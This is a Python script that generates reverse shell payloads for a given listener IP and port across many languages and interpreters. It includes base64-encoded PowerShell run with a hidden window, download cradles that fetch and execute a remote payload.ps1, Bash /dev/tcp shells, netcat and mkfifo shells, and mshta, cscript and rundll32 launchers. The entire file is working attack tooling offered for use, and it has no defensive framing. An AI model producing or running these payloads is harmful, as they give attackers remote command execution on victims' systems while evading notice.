#!/usr/bin/env python3
import base64
import sys
import argparse
import os
import ipaddress
import random
import string

def create_powershell_multiliner(ip, port):
  payload = f'''
$client = [System.Net.Sockets.TcpClient]::new("{ip}",{port});
$stream = $client.GetStream();
$buffer = New-Object byte[] 1024;
$encoding = [System.Text.Encoding]::ASCII;
while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {{
    $data = $encoding.GetString($buffer, 0, $bytesRead);
    $output = try {{ iex $data 2>&1 | Out-String }} catch {{ $_.Exception.Message }};
    $prompt = "PS " + (Get-Location).Path + "> ";
    $response = $encoding.GetBytes($output + $prompt);
    $stream.Write($response, 0, $response.Length);
    $stream.Flush();
}}
$client.Close();
'''
  return payload

def create_powershell_oneliner(ip, port):
  payload = f'''
$client = [System.Net.Sockets.TcpClient]::new("{ip}",{port});
$stream = $client.GetStream();
$buffer = New-Object byte[] 1024;
$encoding = [System.Text.Encoding]::ASCII;
while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {{
    $data = $encoding.GetString($buffer, 0, $bytesRead);
    $output = try {{ iex $data 2>&1 | Out-String }} catch {{ $_.Exception.Message }};
    $prompt = "PS " + (Get-Location).Path + "> ";
    $response = $encoding.GetBytes($output + $prompt);
    $stream.Write($response, 0, $response.Length);
    $stream.Flush();
}}
$client.Close();
'''

  encoded = base64.b64encode(payload.encode('utf-16le')).decode()

  cmd = f"powershell -NoP -W Hidden -Enc {encoded}"
  return cmd


def create_powershell_download_oneliner(ip, port, filename="payload.ps1"):
    payload = f'''IEX( iWr http://{ip}:{port}/{filename})'''
    encoded_payload = base64.b64encode(payload.encode('utf-16le')).decode()
    return f"powershell -NoP -W Hidden -Enc {encoded_payload}"

def create_bash_oneliner(ip, port):
    return f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"

def create_bash_minified_variants(ip, port):
    variants = [
        f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        f"0<&196;exec 196<>/dev/tcp/{ip}/{port};sh <&196 >&196 2>&196",
        f"exec 5<>/dev/tcp/{ip}/{port};cat <&5|while read l;do $l 2>&5 >&5;done",
        f"/bin/bash -l > /dev/tcp/{ip}/{port} 0<&1 2>&1",
        f"sh -i >& /dev/udp/{ip}/{port} 0>&1"
    ]
    return variants

def create_python_oneliner(ip, port):
    return f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"

def create_python3_oneliner(ip, port):
    return f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'"

def create_python3_oneliner_enc(ip, port):
    payload = f'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
    b64_payload = base64.b64encode(payload.encode()).decode()
    oneliner = f"python3 -c \"import base64;exec(base64.b64decode('{b64_payload}').decode())\""
    return oneliner

def create_perl_oneliner(ip, port):
    return f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"

def create_perl_windows_oneliner(ip, port):
    return f"perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"

def create_php_oneliner(ip, port):
    return f"php -r '$sock=fsockopen(\"{ip}\",{port});$descriptor=array(0=>$sock,1=>$sock,2=>$sock);proc_open(\"/bin/sh -i\", $descriptor, $pipes);'"

def create_php_alternative_oneliner(ip, port):
    return f"php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

def create_php_popen_oneliner(ip, port):
    return f"php -r '$sock=fsockopen(\"{ip}\",{port});popen(\"sh -i <&3 >&3 2>&3\", \"r\");'"

def create_ruby_oneliner(ip, port):
    return f"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{ip}\",{port});while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'"

def create_golang_oneliner(ip, port):
    return f"echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"

def create_nodejs_oneliner(ip, port):
    return f"node -e 'require(\"child_process\").exec(\"nc -e /bin/sh {ip} {port}\")'"

def create_nodejs_alternative_oneliner(ip, port):
    return f"node -e 'sh=require(\"child_process\").spawn(\"/bin/sh\");net=require(\"net\");conn=net.connect({port},\"{ip}\");conn.pipe(sh.stdin);sh.stdout.pipe(conn);sh.stderr.pipe(conn);'"

def create_lua_oneliner(ip, port):
    return f"lua -e \"local s=require('socket');local t=assert(s.tcp());t:connect('{ip}',{port});while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();\""

def create_netcat_oneliners(ip, port):
    variants = [
        f"nc -e /bin/sh {ip} {port}",
        f"nc -c /bin/sh {ip} {port}",
        f"ncat {ip} {port} -e /bin/sh",
        f"rm -f /tmp/p;mknod /tmp/p p && nc {ip} {port} 0/tmp/p",
        f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
    ]
    return variants

def create_cscript_oneliner(ip, port):
    script = f"""var shell = WScript.CreateObject("WScript.Shell");
var socket = new ActiveXObject("MSWinsock.Winsock");
socket.Connect("{ip}", {port});
var command = "";
while(true) {{
    command = socket.ReceiveText();
    if (command.length == 0 || command == "exit") break;
    var exec = shell.Exec("cmd.exe /c " + command);
    var output = exec.StdOut.ReadAll();
    var err = exec.StdErr.ReadAll();
    socket.SendText(output + err + "\\r\\nCMD> ");
}}
socket.Close();
"""
    
    encoded_script = base64.b64encode(script.encode()).decode()
    
    return f"""echo var b64 = "{encoded_script}"; var decoded = ""; try {{ decoded = atob(b64); }} catch(e) {{ var binary = ""; var bytes = atob(b64).split(''); for (var i = 0; i < bytes.length; i++) {{ binary += String.fromCharCode(bytes[i].charCodeAt(0)); }} decoded = binary; }} eval(decoded); > %TEMP%\\rs.js && cscript //nologo %TEMP%\\rs.js && del %TEMP%\\rs.js"""

def create_windows_rundll_shellcode(ip, port):
    filename = "payload.ps1"
    payload = f'''IEX( iWr http://{ip}:{port}/{filename})'''
    encoded_payload = base64.b64encode(payload.encode('utf-16le')).decode()
    cmd = f"powershell -NoP -W Hidden -Enc {encoded_payload}"

    return f"rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WScript.Shell\").run(\"{cmd}')\",0,true);"

def create_mshta_oneliner(ip, port):
    filename = "payload.ps1"

    payload = f'''IEX( iWr http://{ip}:{port}/{filename})'''
    encoded_payload = base64.b64encode(payload.encode('utf-16le')).decode()
    cmd =  f"powershell -NoP -W Hidden -Enc {encoded_payload}"

    return f"mshta vbscript:CreateObject(\"WScript.Shell\").Run(\"{cmd}\",0,true)(window.close)"

def main():
    parser = argparse.ArgumentParser(description="Generate minified reverse shell one-liners")
    parser.add_argument("ip", help="Listener IP address")
    parser.add_argument("port", type=int, help="Listener port")
    parser.add_argument("-o", "--output", help="Save payloads to file")
    
    args = parser.parse_args()
    
    try:
        ipaddress.ip_address(args.ip)
    except ValueError:
        print("[-] Error: Invalid IP address format")
        sys.exit(1)
        
    if not 1 <= args.port <= 65535:
        print("[-] Error: Port must be between 1 and 65535")
        sys.exit(1)
    
    payloads = []
 

    payloads.append(("PowerShell Multiliner", create_powershell_multiliner(args.ip, args.port)))
    payloads.append(("PowerShell Base64", create_powershell_oneliner(args.ip, args.port)))
    payloads.append(("PowerShell Download Cradle", create_powershell_download_oneliner(args.ip, args.port)))

    for i, variant in enumerate(create_bash_minified_variants(args.ip, args.port)):
        payloads.append((f"Bash Variant {i+1}", variant))
                       
    payloads.append(("Python", create_python_oneliner(args.ip, args.port)))
    payloads.append(("Python3", create_python3_oneliner(args.ip, args.port)))
    payloads.append(("Python3 Enc", create_python3_oneliner_enc(args.ip, args.port)))

    payloads.append(("Perl Linux", create_perl_oneliner(args.ip, args.port)))
    payloads.append(("Perl Windows", create_perl_windows_oneliner(args.ip, args.port)))

    payloads.append(("PHP", create_php_oneliner(args.ip, args.port)))
    payloads.append(("PHP Alternative", create_php_alternative_oneliner(args.ip, args.port)))
    payloads.append(("PHP Popen", create_php_popen_oneliner(args.ip, args.port)))

    payloads.append(("Ruby", create_ruby_oneliner(args.ip, args.port)))

    payloads.append(("NodeJS", create_nodejs_oneliner(args.ip, args.port)))
    payloads.append(("NodeJS Alternative", create_nodejs_alternative_oneliner(args.ip, args.port)))

    for i, variant in enumerate(create_netcat_oneliners(args.ip, args.port)):
        payloads.append((f"Netcat Variant {i+1}", variant))

    payloads.append(("cscript", create_cscript_oneliner(args.ip, args.port)))
    payloads.append(("MSHTA", create_mshta_oneliner(args.ip, args.port)))
    # payloads.append(("RunDLL32", create_windows_rundll_shellcode(args.ip, args.port)))

    for name, payload in payloads:
        print(f"[+] {name}:")
        print(payload)
        print()

    if args.output:
        try:
            with open(args.output, 'w') as f:
                for name, payload in payloads:
                    f.write(f"# {name}\n{payload}\n\n")
            print(f"[+] Payloads saved to {args.output}")
        except Exception as e:
            print(f"[-] Failed to save payloads to file: {str(e)}")

if __name__ == "__main__":
    main()
